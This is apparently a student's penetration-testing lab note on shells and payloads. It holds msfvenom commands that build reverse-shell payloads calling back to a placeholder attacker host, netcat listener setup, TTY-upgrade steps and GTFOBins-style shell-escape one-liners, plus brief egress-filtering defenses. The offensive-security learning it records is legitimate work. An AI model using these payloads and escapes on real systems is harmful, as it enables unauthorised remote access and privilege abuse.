# Shells & Payloads

> Status: 🟨 In progress
> Date started: 2026-10-26
> Date finished: 

## 1. Goal
Get and stabilize command execution: shell types, generating payloads, catching the connection, and upgrading to a usable TTY.

## Shell types
- **Reverse** — target connects back to my listener (best through firewalls/NAT). Catch with `nc -lvnp <port>` or `socat`.
- **Bind** — target listens, I connect in (needs the port reachable).
- **Web shell** — a script on the web server I drive via the browser.

## Payload generation (msfvenom)
Generate per-target payloads (set LHOST/LPORT; reverse-shell bodies not stored here):
```text
msfvenom -p linux/x64/shell_reverse_tcp   LHOST=<me> LPORT=<p> -f elf   > x.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<me> LPORT=<p> -f exe   > x.exe
msfvenom -p java/jsp_shell_reverse_tcp    LHOST=<me> LPORT=<p> -f war   > x.war   # Tomcat
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<me> LPORT=<p> -f asp > x.asp
```
Catch with `multi/handler` (meterpreter) or `nc`/`socat`. One-liner reverse shells (bash/powershell/python): generate from **revshells.com** rather than storing them here.

## Upgrade to a full TTY (do this immediately)
A raw `nc` shell has no tab-complete, no arrows, no `sudo`. Upgrade:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'   # step 1
# Ctrl+Z
stty raw -echo; fg                                 # step 2 (back in the shell)
export TERM=xterm                                  # step 3
```
Or use `socat` both ends for a full PTY from the start.

**Finishing touches after the upgrade:**
```bash
stty rows 38 columns 116      # match your terminal size (fixes vim/less formatting)
# get your real size first with `stty size` in your own terminal
```
If python isn't available, fallbacks: `script /dev/null -c bash` (or just `script -qc /bin/bash /dev/null`), `/bin/sh -i`, or spawn via perl/ruby/lua/awk (see local spawning below). `cat /etc/shells` shows what shells exist on the box.

## Local shell spawning (from a limited exec / SUID — GTFOBins)
```bash
/bin/sh -i ; python3 -c 'import pty;pty.spawn("/bin/sh")'
awk 'BEGIN{system("/bin/sh")}' ; perl -e 'exec "/bin/sh";'
find . -exec /bin/sh \; -quit ; vim -c ':!/bin/sh'
```

## Fix / defense
EGRESS filtering (block outbound to random ports/IPs) kills most reverse shells; app allow-listing; EDR on payload signatures; least privilege.

> First move after catching a reverse shell: **upgrade the TTY** (python pty → `stty raw -echo; fg` → `export TERM=xterm`) so you get tab-complete, arrows, and `sudo`. A raw shell will bite you otherwise.

## My notes / lab output
Filled in as I run these on lab targets.

## 2. Setup
- Attack box: (Pwnbox / Kali VM)
- Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)

## 3. Commands I used
Each block says which machine it ran on.

```bash
# [ATTACK BOX]

```

```bash
# [TARGET]

```

## 4. Confirmed (what worked)
- 

## 5. Tried, didn't work (and why)
- 

## 6. Open questions / revisit
- 

## 7. Cheat sheet lines
Copied into `cheatsheets/`:
- 
